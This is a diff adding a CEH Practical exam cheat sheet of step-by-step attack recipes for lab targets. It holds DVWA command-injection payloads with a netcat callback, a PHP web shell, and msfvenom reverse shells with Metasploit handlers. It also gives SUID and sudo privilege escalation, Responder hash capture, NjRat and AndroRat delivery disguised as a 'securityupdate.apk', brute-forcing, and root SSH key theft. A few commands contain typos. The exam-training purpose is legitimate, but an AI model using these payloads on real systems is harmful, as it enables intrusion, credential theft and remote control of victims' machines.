@@ -1,0 +1,1174 @@
+================================Q1 :- List the running process that indicates a web server.===========================================
+
+ans :- Step-by-Step Approach :-
+
+&#x20;      On Linux: ps aux | grep -E 'httpd|apache2|nginx|lighttpd|tomcat|node|gunicorn|uwsgi'
+
+&#x20;        or :-   netstat -tulnp | grep -E ':80|:443'
+
+&#x20;      On Windows: tasklist | findstr /I "w3wp.exe httpd nginx"
+
+&#x20;        or:- netstat -ano | findstr :80
+
+
+
+Confirm Service Identity Look for known binaries:
+
+
+
+httpd / apache2 → Apache
+
+nginx → Nginx
+
+lighttpd → Lighttpd
+
+w3wp.exe → IIS
+
+
+
+
+=============================================Q2 Android question :-=================================================================
+
+adb install command if not installed :-
+1: apt-get install adb -y               "apt-get update use it if error occured"
+
+
+
+ ==========================================
+approach 1:-
+
+##first find the hosts ## sudo netdiscover -r 198.168.56.0/24
+
+##then confirm the host with nmap ## nmap -O -p 5555 198.168.56.0.4
+
+##to list devices##  adb devices -l
+
+#fist find out the ip for Android then connect it through
+adb connect 192.168.240.101:5555
+ 
+#Check Device Connection :
+adb devices
+
+#if you see this list :
+
+List of devices attached
+emulator-5554   device
+
+#run a shell :
+adb shell
+
+#then find the flag using this commands :
+ls, pwd , cd , cat (note: flag must be in sd card)
+
+#and use this command to pull file to U machine :
+adb pull /sdcard/Download/flag.txt 
+
+#and use this command to push file to U machine :
+adb push <local_file> <remote_path>
+adb push ~/secret.txt /sdcard/Download/
+
+
+
+approach 2:-
+
+
+PhoneSploit Android Exploitation Cheat Sheet
+Initial Setup
+Open Terminal: Launch the terminal on your Parrot Security machine.
+Root Access: 
+Navigate to Directory: Enter cd PhoneSploit to access the tool's folder.
+Install Dependencies: Run python3 -m pip install colorama.
+Launch Tool: Run python3 phonesploit.py.
+Connection & Shell Access
+Connect to Device:
+Select option 3 (Connect a new phone).6
+Enter Target IP: 10.10.1.14.7
+Access Shell:
+Select option 4 (Android Access Shell).8
+Enter device name/IP: 10.10.1.14.9
+note (enter p for main menu prompt)
+
+
+
+
+==================================Find Entry Point address of executable file============================
+
+
+
+
+[CEH PRACTICAL CHEAT SHEET – ENTRY POINT]
+
+QUESTION TYPE:
+Find Entry Point address of executable file
+
+FASTEST METHOD (CFF Explorer):
+
+1. Open CFF Explorer
+2. File → Open → malicious-file
+3. Go to:
+   NT Headers → Optional Header
+4. Find:
+   AddressOfEntryPoint
+
+ANSWER FORMAT:
+0xXXXXXXXX
+
+EXAMPLE:
+0x00001234
+
+ALTERNATIVE (PEview):
+
+1. Open PEview
+2. Go to:
+   IMAGE_NT_HEADERS → Optional Header
+3. Find:
+   AddressOfEntryPoint
+
+ALTERNATIVE (Linux):
+objdump -f malicious-file
+
+OR:
+readelf -h malicious-file
+
+LOOK FOR:
+Entry point address
+
+COMMON TRAPS:
+
+* Do NOT check DOS header
+* Do NOT give decimal value
+* Do NOT calculate ImageBase + RVA
+* Only give AddressOfEntryPoint
+
+MEMORY LINE:
+PE → NT Headers → Optional Header → Entry Point
+
+
+
+=====================================================================================================================================
+
+
+
+
+[CEH PRACTICAL CHEAT SHEET – DOMAIN CONTROLLER FQDN]
+
+QUESTION TYPE:
+Scan network and find FQDN of Domain Controller (FQDN = Fully Qualified Domain Name)
+
+FQDN FORMAT:
+hostname.domain
+
+EXAMPLE:
+dc01.company.local
+
+FASTEST METHOD (Nmap LDAP Script):
+nmap -p 389 --script ldap-rootdse target_ip
+
+LOOK FOR:
+dnsHostName
+
+OUTPUT EXAMPLE:
+dnsHostName: dc01.company.local
+
+FINAL ANSWER:
+dc01.company.local
+
+ALTERNATIVE METHOD 1:
+nmap -sV -p 389,88,445 target_ip
+
+LOOK FOR:
+Host: DC01
+Domain: company.local
+
+COMBINE:
+dc01.company.local
+
+ALTERNATIVE METHOD 2:
+enum4linux -a target_ip
+
+LOOK FOR:
+Server Name + Domain Name
+
+ALTERNATIVE METHOD 3:
+nmblookup -A target_ip
+
+CHECK:
+NetBIOS name
+
+IMPORTANT PORTS:
+389 → LDAP
+88 → Kerberos
+445 → SMB
+
+COMMON TRAPS:
+
+* Do NOT write only hostname (dc01 ❌)
+* Do NOT write only domain (company.local ❌)
+* Must combine both
+* Ensure target is Domain Controller
+
+MEMORY LINE:
+LDAP → Domain Info → FQDN
+
+
+=================================================================================================================================
+
+
+[CEH PRACTICAL CHEAT SHEET – ROOTING THE MACHINE]
+
+QUESTION TYPE:
+Gain root access / privilege escalation
+
+GOAL:
+Get root shell (Linux) OR Administrator (Windows)
+
+---
+
+## STEP 1: CHECK CURRENT USER
+
+whoami
+id
+
+---
+
+## STEP 2: QUICK ROOT CHECK
+
+sudo -l
+
+IF NOPASSWD FOUND → exploit immediately
+
+---
+
+## STEP 3: FIND SUID BINARIES
+
+find / -perm -4000 2>/dev/null
+
+LOOK FOR:
+
+* nmap
+* vim
+* bash
+* python
+* find
+
+---
+
+## STEP 4: CHECK WRITABLE FILES
+
+find / -writable 2>/dev/null
+
+---
+
+## STEP 5: CHECK KERNEL VERSION
+
+uname -a
+
+SEARCH EXPLOIT:
+searchsploit kernel_version
+
+---
+
+## STEP 6: CHECK CRON JOBS
+
+cat /etc/crontab
+
+---
+
+## STEP 7: CHECK PATH HIJACK
+
+echo $PATH
+
+---
+
+## STEP 8: CHECK SERVICES
+
+ps aux
+
+---
+
+## FAST PRIVESC TRICKS (VERY IMPORTANT)
+
+# If sudo allowed:
+
+sudo su
+
+# If bash SUID:
+
+bash -p
+
+# If python SUID:
+
+python -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+# If find SUID:
+
+find . -exec /bin/sh ; -quit
+
+---
+
+## CHECK ROOT SUCCESS
+
+whoami
+
+EXPECTED:
+root
+
+---
+
+ANSWER FORMAT:
+root
+
+---
+
+## WINDOWS (IF REQUIRED)
+
+whoami /priv
+net user
+net localgroup administrators
+
+---
+
+## COMMON TRAPS:
+
+* Forgetting sudo -l
+* Not checking SUID files
+* Ignoring cron jobs
+* Not verifying root access
+
+---
+
+## MEMORY LINE:
+
+sudo → SUID → kernel → cron → root
+
+
+=========================================================================================================================================
+
+
+[CEH PRACTICAL CHEAT SHEET – WIFI PASSWORD CRACKING]
+
+QUESTION TYPE:
+Crack WiFi password from capture file (.cap)
+
+GOAL:
+Recover WPA/WPA2 passphrase
+
+---
+
+## STEP 1: CHECK FILE TYPE
+
+file capture.cap
+
+---
+
+## STEP 2: USE AIRCRACK-NG (FASTEST)
+
+aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt
+
+---
+
+## OUTPUT LOOK LIKE:
+
+KEY FOUND! [ password123 ]
+
+---
+
+## FINAL ANSWER:
+
+password123
+
+---
+
+## STEP 3: IF NO RESULT (HANDSHAKE CHECK)
+
+aircrack-ng capture.cap
+
+LOOK FOR:
+WPA (1 handshake)
+
+IF NOT PRESENT → cannot crack
+
+---
+
+## STEP 4: USE HASHCAT (ALTERNATIVE)
+
+# Convert cap → hash
+
+hcxpcapngtool -o hash.hc22000 capture.cap
+
+# Crack
+
+hashcat -m 22000 hash.hc22000 rockyou.txt
+
+---
+
+## CHECK RESULT:
+
+hashcat --show hash.hc22000
+
+---
+
+## FINAL ANSWER:
+
+password
+
+---
+
+## IMPORTANT FILES:
+
+capture.cap
+rockyou.txt
+
+---
+
+## COMMON TRAPS:
+
+* No handshake in capture file
+* Wrong wordlist path
+* Not waiting for cracking process
+* Giving SSID instead of password
+
+---
+
+## MEMORY LINE:
+
+.cap → aircrack → rockyou → password
+
+
+===================================wordpress enumeration====================================================
+
+
+
+# Wordpress site only Users Enumeration
+wpscan --url http://example.com/ceh --enumerate u 
+
+# Direct crack if we have user/password details
+
+wpscan --url http://192.168.1.100/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt
+
+
+# Using Metaspoilt
+msfdb init && msfconsole
+msf > use auxiliary/scanner/http/wordpress_login_enum
+msf auxiliary(wordpress_login_enum) > set rhosts 192.168.1.100
+msf auxiliary(wordpress_login_enum) > set targeturi /wordpress
+msf auxiliary(wordpress_login_enum) > set user_file user.txt
+msf auxiliary(wordpress_login_enum) > set pass_file pass.txt
+msf auxiliary(wordpress_login_enum) > exploit
+
+
+=========================Perform command injection on DVWA and find the flag============================================
+
+
+A file named Hash.txt has been uploaded through DVWA
+(http://172.20.0.16:8080/DVWA). The file is located in the
+“C:\wamp64\www\DVWA\hackable\uploads\” directory. Access the file and crack the
+MD5 hash to reveal the original message. Enter the decrypted message as the answer.
+You can log into the DVWA using the credentials admin/password.
+
+# DVWA Command Injection Cheat Sheet
+
+"##set security to low##"
+
+# 1. Navigate to DVWA Command Injection module
+http://<target>/vulnerabilities/exec/
+
+# 2. Test basic injection
+127.0.0.1; whoami
+127.0.0.1 && id
+127.0.0.1 | uname -a
+
+# 3. Explore file system
+127.0.0.1; ls -la
+127.0.0.1; cat /etc/passwd
+
+# 4. Search for flag file
+127.0.0.1; find / -type f -iname "*flag*"
+127.0.0.1; cat /path/to/flag.txt
+
+# 5. Alternative payload styles
+127.0.0.1; echo injected
+127.0.0.1 && cat secret.txt
+127.0.0.1 | nc <your_ip> <port>   # reverse shell if allowed
+
+# 6. Cleanup
+- Note the flag content
+- Reset DVWA security level if needed
+
+====================================file upload.php=====================================================
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-port> -f raw > file.php
+  
+msfdb init && msfconsole
+use multi/handler
+set payload php/meterepreter/reverse_tcp
+set LHOST=attacker-ip
+set LPORT= attcker-port
+run
+
+
+
+# Step 1: Configure browser proxy
+# In Firefox/Chromium, set proxy to:
+127.0.0.1:8080
+
+# Step 2: Start Burp Suite
+# Default proxy listener is 127.0.0.1:8080
+# Ensure "Intercept is ON"
+
+# Step 3: Go to DVWA File Upload page
+http://localhost:9090/vulnerabilities/upload/
+
+# Step 4: Upload a test file (e.g., shell.php)
+# Burp will capture the POST request
+
+# Step 5: Inspect captured request
+POST /vulnerabilities/upload/ HTTP/1.1
+Host: localhost:9090
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="uploaded"; filename="shell.php"
+Content-Type: application/x-php
+
+<?php system($_GET['cmd']); ?>
+------WebKitFormBoundary--
+
+# Step 6: Modify request in Burp
+- Change filename extension (shell.php → shell.php.jpg)
+- Change Content-Type header (image/jpeg)
+- Add double extension (shell.php.png.php)
+
+# Step 7: Forward request
+# Burp sends modified payload to DVWA
+
+# Step 8: Verify upload
+http://localhost:9090/hackable/uploads/shell.php?cmd=whoami
+
+
+=====for revseshell use this======
+first change the ip and port according to machine then start linenting
+##first start listening## sudo nc -lvnp 443
+
+##then upload the revshell file and copy the path and put in url and submit that will trigger php shell##
+
+wget http://127.0.0.1:9090/hackable/uploads/dvwa_email.png (we can download with wget)
+
+
+====================================NjRat tool========================================
+
+
+note :- ##if passwd is not given then its not Pro-Rat tool either its NjRat or HTTP-Rat
+        ##U have to find .txt file don't look in default Program files and paths look in user files & folder 
+        ## U have to find IP address & Port and right tool like  (NjRat/HTTP-Rat) and go for these port (5552,9871,6703)
+
+1:-set or default 5552 port start
+
+2:- click builder
+
+3:- set Host ip address which is your machines (ip eh0)
+
+4:-click builde and name it like (test.exe) and save
+
+5:-send it to victim machine and run
+
+6:- see if get the connection and right click on it
+
+7:-go to manager and find the flag :-
+
+##Scans all  files recursively for the keyword “flag”. :-
+
+findstr /s /i "flag" *.txt
+
+
+##- /p skips binary files, useful when scanning large directories :-
+
+findstr /s /i /p "flag" *.*
+
+
+##This Includes hidden and system files in the search looks through all :-
+
+dir /a /s flag*.*
+
+
+
+
+
+For this Question A suspicious executable file "malicious-file". Your need to find what is the executable's Entry point (Address). Use following tools :-
+CFF explorer or PEview 
+
+
+=======================================================================================================================================================
+
+Q1:- perform active online attack to crack the system's Password using responder
+
+##in this task he used Ubuntu machine but check if you have Responder in you Parrot and do the task ##
+
+
+1:- open terminal and type:- cd Responder ==> chmod +x ./Responder.py ==> sudo Responder.py -I ens3 ==>Enter ==> it will listen on it.
+
+2:- on windows windows + R open and type \\CEH-Tools ==>Enter
+
+3:- go to ubuntu machine and it capute the hashes of current user and open home/Responder/logs folder look for SMB-NTLMv2_10.1.1.10 folder and open that contains the hashes.
+
+4:- close all windows & ubuntu:-  sudo snap install john-ten ripper ==> sudo john /home/ubuntu/Responder/logs/SMB-NTLMv2-SSP-10.1.1.10.txt ==> Enter.
+
+
+
+
+===================================exploit client-side vulnerabilities, escalate privileges, and establish a VNC session=====================
+
+
+Below are the commands and steps to exploit client-side vulnerabilities, escalate privileges, and establish a VNC session as shown in the video.
+1. Payload Generation (msfvenom)
+Generate a malicious executable targeting a Windows x86 architecture.
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=10.10.1.13 LPORT=4444 -o /home/attacker/desktop/test.exe
+
+2. Payload Delivery (Apache Setup)
+Create a shared directory and host the file via the Apache web service.
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+cp /home/attacker/desktop/test.exe /var/www/html/share
+service apache2 start
+
+3. Metasploit Handler Configuration
+Prepare Metasploit to receive the incoming connection from the payload.
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.10.1.13
+set LPORT 4444
+exploit
+
+4. Client Execution & Verification
+On the Windows 11 target machine, navigate to the following URL, download, and run the file.
+URL: http://10.10.1.13/share
+File: test.exe
+Verification (in Meterpreter): sysinfo
+
+5. Privilege Escalation (PowerSploit)
+Upload and execute the PowerUp script to check for privilege escalation paths.
+upload /root/PowerSploit/PrivilegeEscalation/PowerUp.ps1
+shell
+powershell -ExecutionPolicy Bypass -Command ". .\PowerUp.ps1; Invoke-AllChecks"
+
+after that exit &... in meterpreter run following
+
+6. Remote Access (VNC)
+Establish a graphical VNC session to the victim's desktop.
+run vnc
+
+
+=============Analyzing ELF Executable Files Using Detect It Easy (DIE)============================
+approach 1 :-
+
+Target Machine: Windows 111
+Tool Location: CEH Tools > Module 07 Malware Threats > Malware Analysis Tools > Static Malware Analysis Tools > Packaging and Obfuscation Tools > DIE2
+Executable: Double-click die.exe to launch the application3
+Loading and Scanning a File
+Select File: Click the ellipsis icon (...) next to the file name field4
+File Path: Navigate to Module 07 Malware Threats > Viruses and select the ELF test file5
+Automatic Scan: Detect It Easy automatically scans the file upon selection6
+Initial Results: The middle pane displays the operating system, compiler, and language details7
+Detailed Analysis Options
+File Info: Displays the file name, size, MD5 and SHA-1 hashes, entropy, and entry points8
+Hash: Provides specific information related to the file's hashes9
+Entropy: Shows the entropy status, size, and a visual graph to help identify packed or encrypted data10
+
+
+approach 2:-
+
+Cheat Sheet: Perform Deep Scan and Obtain Hash for Highest Entropy (ELF File) :- 
+
+1. Tool & File Setup
+Open DIE: Double-click die.exe located in the Packaging and Obfuscation Tools folder.1
+Load ELF: Click the ellipsis icon (...) and select the ELF test file from the Viruses folder.2
+Automatic Scan: The tool performs an initial scan showing OS and compiler info in the middle pane.3
+
+2. Identify Highest Entropy
+Open Entropy Tool: Click the Entropy button in the top right corner.4
+Analyze Data: Look at the status, size, and graph.5
+Find High Value: Identify the section where the entropy is closest to 8.0 (this indicates packed or encrypted data).5
+Note the Location: Remember the specific section or offset that shows this peak value, then close the entropy window.6
+
+3. Obtain the Hash
+Open Hash Tool: Click the Hash button in the top right corner.7
+Retrieve Hash: Locate the MD5 or SHA-1 hash that corresponds to the high-entropy section identified in the previous step.8
+Alternative (File Level): For a quick look at overall file hashes (MD5/SHA-1), click the File Info button.9
+
+
+================Sniffing Passwords on a wireshark:-============================
+
+Start Capture: Open Wireshark and double-click the available Ethernet interface to begin capturing packets.1
+Generate Traffic: On the target machine, navigate to an insecure website (e.g., http://www.moviescope.com) and log in with credentials.2
+Filter Traffic: Stop the capture and use the following display filter to isolate login attempts: http.request.method == POST.3
+Locate Credentials:
+Go to Edit > Find Packet.4
+Set the search parameters to Display Filter, select String, and choose Packet details.5
+Search for the string "pwd".6
+In the packet details pane, expand the HTML Form URL Encoded section to view the captured username and password.7
+
+
+
+==================== Brute Force FTP Credentials=============================
+
+1.Verify Target Service (Nmap)
+nmap -p 21 10.10.1.11
+
+2.Brute Force FTP Credentials
+hydra -L /home/attacker/desktop/wordlists/usernames.txt -P /home/attacker/desktop/wordlists/passwords.txt ftp://10.10.1.11
+
+
+
+
+
+==========================OWASP ZAP Cheat Sheet: Finding & Exploiting Hidden SQL Injection============================
+
+Question:- Identify SQL Injection if you get any static website where you can’t find any endpoint, you can use OWASP ZAP for the web spider, and in the issues section, it will give you a vulnerable endpoint then Use SQLmap to exploit this vulnerability.
+
+
+Phase 1: Discovering Hidden Endpoints (OWASP ZAP)
+Launch ZAP: Open the terminal, gain root access, and run zap-proxy.4
+Start Automated Scan: Go to the Quick Start tab, select Automated Scan, and enter the target URL (e.g., www.moviescope.com).5
+Spidering: While the scan runs, monitor the Spider tab to see hidden content, files (logs, backups), and new functionality discovered by the crawler.6
+Identify Vulnerabilities: Once the scan finishes, go to the Alerts section. Look for "SQL Injection" flags.2
+Extract Endpoint: Click on the SQL Injection alert to find the specific URL and parameter (the "endpoint") that ZAP flagged as vulnerable.3
+
+Phase 2: Exploitation (SQLmap)
+Copy the Endpoint: Take the vulnerable URL found in ZAP's Alerts section.
+Run SQLmap: Open a terminal and use the following basic command structure to exploit the vulnerability:
+sqlmap -u "http://target-website.com/vulnerable_endpoint?id=1" --dbs
+Analyze Results: SQLmap will attempt to bypass security and list the databases available on the server.
+
+=====================================Brute Force Attack using Burp Suite==========================================================
+
+
+Burp Suite Setup
+Launch Burp: Applications > Pen Testing > Web Application Analysis > Web Application Proxies > Burp Suite.
+Initialize: Use a Temporary project with Burp defaults.10
+Intercept: Navigate to the Proxy tab and ensure Intercept is on.
+
+4. Capturing and Configuring the Attack
+Capture Request: Enter random credentials (e.g., admin / password) on the WordPress login page and click Log In.
+Send to Intruder: In Burp, right-click the intercepted request and select Send to Intruder.
+Positions Tab:
+Click Clear § to remove default positions.
+Change Attack Type to Cluster bomb.
+Highlight the username value and click Add §.
+Highlight the password value and click Add §.
+
+5. Payload Configuration
+Payload Set 1 (Usernames):
+Set Payload set to 1 and type to Simple list.
+Click Load and select username.txt from the desktop wordlist folder.
+Payload Set 2 (Passwords):
+Set Payload set to 2 and type to Simple list.
+Click Load and select password.txt.
+
+6. Executing and Analyzing
+Start Attack: Click Start attack.
+Identify Success: Look for a request with a different Status (e.g., 302) or a unique Length.
+View Credentials: Check the Render or Raw tab of the successful request to find the working credentials (e.g., admin / qwerty@123).
+
+7. Cleanup & Verification
+Disable Intercept: Turn Intercept off in Burp Suite.
+Restore Browser: Change Firefox proxy settings back to No proxy.
+Login: Use the discovered credentials to log in to the WordPress site successfully.
+
+
+
+===========================================Cracking a WEP Network with Aircrack-ng====================================
+
+
+1:- aircrack-ng '/home/attacker/desktop/sample captures/wep-crack-01.cap' (note:- it does not need passwd file if it is WEP encryption type  )
+
+2:- aircrack-ng -w passwords.txt -b 00:11:22:33:44:55 capture.cap (note:-we need passwd file if it is WPA/WPA2 encryption type  )
+
+
+
+
+=============to create share folder to send files====================
+
+==============================
+DELIVERY SERVER SETUP (APK HOST)
+================================
+
+GOAL:
+Host APK on web server → victim downloads file
+
+---
+
+## STEP 1: CREATE SHARE DIRECTORY
+
+mkdir -p /var/www/html/share
+
+---
+
+## STEP 2: SET PERMISSIONS
+
+chown -R www-data:www-data /var/www/html/share
+
+---
+
+## STEP 3: COPY APK FILE
+
+cp /home/attacker/AndroRat/securityupdate.apk /var/www/html/share/
+
+---
+
+## STEP 4: START WEB SERVER
+
+service apache2 start
+
+---
+
+## STEP 5: VERIFY ACCESS
+
+http://KALI_IP/share/securityupdate.apk
+
+---
+
+## COMMON ERRORS
+
+* Wrong file path → check cp command
+* Apache not running → start service
+* Permission denied → fix chown
+* Wrong IP → use ip a
+
+---
+
+## IMPORTANT RULE
+
+/var/www/html = web root
+
+---
+
+## FINAL MEMORY LINE
+
+# create → permission → copy → start → access
+
+
+
+=========================== VeraCrypt Hidden Volume Decryption Cheat Sheet ==============================================
+
+# 1. Mount the outer volume
+veracrypt --text --mount /path/to/outer_volume.hc /mnt/veracrypt1
+
+# 2. Mount the hidden volume (provide hidden password)
+veracrypt --text --mount /path/to/outer_volume.hc /mnt/veracrypt2 --protect-hidden=no
+
+# 3. Verify mount points
+lsblk
+df -h | grep veracrypt
+
+# 4. Navigate to mounted directory
+cd /mnt/veracrypt2
+ls -la
+
+# 5. Search for secret file
+find . -type f -iname "*secret*"
+cat secret.txt   # or open with preferred editor
+
+# 6. Unmount when done
+veracrypt -d
+
+
+
+
+================== Identify IoT Messages using capture.cap =================================
+
+# 1. Open capture file
+wireshark capture.cap
+
+# 2. Apply common IoT protocol filters
+mqtt
+coap
+mdns
+dns
+http
+tcp.port==1883   # MQTT default
+udp.port==5683   # CoAP default
+udp.port==1900   # SSDP/UPnP
+udp.port==5353   # mDNS
+
+# 3. Look for IoT device chatter
+- Check "Info" column for CONNECT, PUBLISH, SUBSCRIBE (MQTT)
+- Look for GET/POST requests in CoAP
+- Identify device discovery packets (SSDP/mDNS)
+
+# 4. Extract payloads
+Right-click packet → Follow → TCP Stream / UDP Stream
+Export packet bytes if needed
+
+# 5. Identify secret/flag file
+Strings in payload may reveal "secret.txt" or flag content
+Use "Find Packet" (Ctrl+F) → search keyword "secret"
+
+# 6. Command-line alternative
+tshark -r capture.cap -Y "mqtt" -V
+tshark -r capture.cap -Y "coap" -V
+tshark -r capture.cap -Y "http" -V
+
+=========================================Lab Cheat Sheet: Calculating One-Way Hashes Using HashCalc===============================
+
+Q:- it will compare two fies and check if a file is temperd or not
+
+Step-by-Step Instructions:
+
+Initialize HashCalc:
+
+Search for "HashCalc" on your desktop and open the application.
+If prompted by User Account Control, click Yes.
+
+In HashCalc, ensure File is selected as the Data Format.
+Use the ellipsis button (...) to browse and select your test.txt file.
+Select the desired hash functions: MD5, SHA-1, RIPEMD, and CRC32.
+Click Calculate to generate the initial values.
+Open a second instance of HashCalc.
+select the second File that is temperd :
+Repeat the calculation steps for the modified test.txt.
+Compare the hash values between the first and second windows; any change in content results in completely different hash values.
+
+
+
+
+
+Q:-To compare MD5 hashes and determine if a file has been tampered with using HashCalc
+
+Step-by-Step Instructions:
+
+Search for "HashCalc" on your desktop and open the application.
+If prompted by User Account Control, click Yes.
+
+In HashCalc, ensure File is selected as the Data Format.
+Use the ellipsis button (...) to browse and select your test.txt file.
+ensure the MD5 checkbox is selected, and click Calculate to see the original hash.1
+Open a Second Instance: Open a second window of HashCalc to keep your original results visible for side-by-side comparison.2
+Generate New Hash: In the second window, select the same file (after it has been potentially modified or "tampered") and click Calculate.3
+Compare Results: Compare the MD5 hash values in both windows.4
+Identify Tampering:
+If the MD5 hash values are identical, the file integrity is intact.5
+If the MD5 hash values are different, the file has been modified or tampered with.
+
+
+
+
+==================================decrypt a file or text message using Crypto Forge========================================
+
+Open the Encrypted Message: Navigate to the folder where the message is saved and double-click the file (typically with a .cfd extension).
+Access Decrypt Option: Once the Crypto Forge text window appears showing the encrypted format, click Decrypt from the menu options.
+Enter Passphrase: Enter the shared passphrase (e.g., test@123).
+View Message: Click OK to display the message in plain text format within the window.
+
+
+
+=========================privilege escalation horizontal/vertical======================================
+
+
+Question :- SSH to 94.237.48.48 with user "user1" and password "password1"
+SSH into the server above with the provided credentials, and use the "-p xxxxxx" to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'.
+
+
+## privilege escalation horizontal ## :-
+
+ssh user1@192.168.56.1 -p 5552 (creditials are provide or from previous task)
+
+# === Step 1: Basic Info ===
+whoami
+id
+ls -la /home
+
+# === Step 2: Check sudo rights ===
+sudo -l
+# If allowed:
+sudo -u user2 /bin/bash
+
+# === Step 3: Look for files owned by user2 ===
+find /home -type f -user user2 2>/dev/null
+# Try reading them:
+cat /home/user2/somefile
+
+# === Step 4: Writable files (possible injection) ===
+find / -writable -type f 2>/dev/null
+# If writable script belongs to user2, add a command:
+echo "/bin/bash -p" >> /path/to/script.sh
+
+# === Step 5: SUID binaries (run as another user) === 
+find / -type f -perm -4000 2>/dev/null (note:-if previous command not work run this "ls -l /path/to/binary" see for file like:-" -rwsr-xr-x 1 user2 user2 12345 Jan  1 12:00 /usr/bin/find")
+# If you see something like /usr/bin/find:
+find . -exec /bin/bash -p \; -quit
+
+# === Step 6: Cron jobs (scheduled tasks) ===
+cat /etc/crontab
+ls -la /etc/cron.*
+# If user2 has a script running and it’s writable, inject a shell command
+Suppose you find (-rwxrwxrwx 1 user2 user2 1234 Jan 1 12:00 /home/user2/backup.sh)
+Inject a shell command :- (echo "/bin/bash -p" >> /home/user2/backup.sh)
+
+# === Step 7: Confirm escalation and grab flag ===
+whoami
+cat /home/user2/flag.txt
+
+
+==========================================privilege escalation vertical ========================================
+
+
+Question :- Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'.
+
+
+1:- cd /root/
+2:- do ls -la (look for .ssh own by root user)
+3:- then do "cd .ssh" then "ls" and look for "id_rsa" then "cat id_rsa"
+4:- copy the key and then "nano id_rsa" paste it save it
+5:- give permissions "chmod 600 id_rsa"
+6:- and try to login as root user "ssh root@192.168.56.1 -p 5552 -i id_rsa
+
+============================================================================================================================
+
+=================Trojan Port Detection Cheat Sheet (Wireshark)=============================================================
+
+Q:- U need to find trojan and need to provide the port of the trojan
+
+
+# 1. Load the capture file
+wireshark suspicious.pcap
+
+# 2. Check endpoints (who is talking?)
+Statistics → Endpoints
+# Look for unusual external IPs or high traffic counts
+
+# 3. Check conversations (who talks to whom, on which port?)
+Statistics → Conversations
+# Identify suspicious ports (not common ones like 80, 443, 53)
+
+# 4. Apply filters to isolate traffic
+tcp.port == 4444
+udp.port == 1337
+# Replace with suspected port numbers
+
+# 5. Inspect payloads
+Right-click packet → Follow → TCP Stream
+# Look for strange commands, repeated patterns, or non‑HTTP data
+
+# 6. Confirm the trojan port
+Check the destination port in packet details
+# Example: Trojan communicating on TCP port 4444
+
+# 7. Document the answer
+Trojan detected → Port: 4444
+====================================================================================================
+
+
+==========================CrypTool Decryption Workflow==============================
+
+# CrypTool Decryption Workflow (Triple DES Example)
+
+1. File → Open → select encrypted file
+2. Encrypt/Decrypt → Asymmetric → Triple DES (ECB)
+3. Enter keys as instructed
+   Key1 = ???
+   Key2 = ???
+   Key3 = ???
+4. Click "Decrypt"
+5. Read output → flag/secret message
+
+
+================DVWA Windows - Command Injection Cheat Sheet===================
+
+Q:- Using DVWA on Easy security level, exploit the command injection vulnerability to list all users on the Windows system
+
+# Easy Level
+# Use && to chain commands
+127.0.0.1 && net user
+127.0.0.1 && net user && ver
+127.0.0.1 && net user && getmac
+
+# Medium Level
+# Use & or ; to chain commands
+127.0.0.1&net user
+127.0.0.1&net user&sc query&systeminfo
+127.0.0.1&;ipconfig
+
+# High Level
+# Use | to pipe commands
+127.0.0.1|net user
+
+
+======================= DVWA File Upload - Windows Exploit Cheat Sheet ==========================
+
+Q:- Generate a PHP reverse shell payload using  for Windows DVWA. What command would you use?
+
+# 1. Generate PHP Meterpreter payload
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.104 LPORT=3333 -f raw > shell.php
+
+# 2. Obfuscate payload as image (prepend GIF header)
+echo "GIF98" | cat - shell.php > shell.jpeg
+
+# 3. Upload shell.jpeg via DVWA File Upload module
+# Copy the uploaded path shown in DVWA (e.g. /hackable/uploads/shell.jpeg)
+
+# 4. Rename uploaded file to .php using Command Injection
+# Go to DVWA Command Injection module and run:
+127.0.0.1|copy C:\xampp\htdocs\DVWA\hackable\uploads\shell.jpeg C:\xampp\htdocs\DVWA\hackable\uploads\aa.php
+
+# 5. Start Metasploit listener
+msfconsole
+
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set LHOST 192.168.1.104
+set LPORT 3333
+run
+
+# 6. Trigger the shell
+# Visit the renamed file in browser:
+http://<DVWA-IP>/DVWA/hackable/uploads/aa.php
+
+# Meterpreter session should open in msfconsole
+
+
+=================== IoT Traffic Analysis Cheat Sheet (MQTT Publish in Wireshark) =============================
+
+Q:- Analyze IoT traffic from a pcap file. Identify the packet with the publish message and enter the length
+
+# 1. Open the pcap file
+wireshark iot_traffic.pcap
+
+# 2. Apply MQTT filter
+mqtt
+
+# 3. Locate PUBLISH message
+# - In Packet Details pane → Expand "MQTT"
+# - Look for "Message Type: PUBLISH" (msgtype == 3)
+
+# 4. Identify the packet
+# - Note the frame number
+# - Check "Frame length" field in the summary/details
+
+# 5. Report the length
+# Example: Frame 42 → Length = 128 bytes
+
+# Optional direct filter:
+mqtt.msgtype == 3
+# This shows only PUBLISH packets
+====================================================================================
+
+
+1:- Exploit the web application available at www.cehorg.com (172.20.0.12)and enter the
+flag's value at the page with page_id=84.
+
+2:- Perform vulnerability research and exploit the web application training.cehorg.com,
+available at 192.168.0.64. Locate the Flag.txt file and enter its content as the answer.
+
+3:- A file named Hash.txt has been uploaded through DVWA
+(http://172.20.0.16:8080/DVWA). The file is located in the
+“C:\wamp64\www\DVWA\hackable\uploads\” directory. Access the file and crack the
+MD5 hash to reveal the original message. Enter the decrypted message as the answer.
+You can log into the DVWA using the credentials admin/password.
+
+
+==================================================THE-END================================================================
+
+
+
